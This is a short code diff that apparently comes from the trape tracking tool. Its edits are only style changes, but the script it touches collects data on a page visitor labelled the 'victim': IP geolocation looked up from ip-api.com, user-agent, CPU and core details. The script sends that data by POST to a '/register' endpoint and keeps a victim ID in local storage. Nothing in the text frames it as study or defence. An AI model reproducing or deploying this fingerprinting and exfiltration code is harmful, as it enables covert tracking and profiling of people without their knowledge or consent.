@@ -8,21 +8,21 @@ if (typeof(io) != 'undefined') {
     $.getJSON('//ip-api.com/json', function(data) {
         var d = getVictimData();
 
-        $.extend( true, d, data);
+        $.extend(true, d, data);
 
-        var obj_parser = new UAParser();
+        var parser = new UAParser();
 
-        d.cpu = JSON.stringify(obj_parser.getCPU())
+        d.cpu = JSON.stringify(parser.getCPU())
             .replace(/"/gi, '')
             .replace(/{/gi, '')
             .replace(/}/gi, '')
             .replace(/:/gi, ' : ') + ' - ' + (navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : '');
         
     	$.ajax({
-            url: '/register',
+            url: "/register",
             data: d,
             dataType: "json",
-            type: 'POST',
+            type: "POST",
             success: function(response) {
                 if (response.status == 'OK'){
                     localStorage.setItem("trape_vId", response.vId);
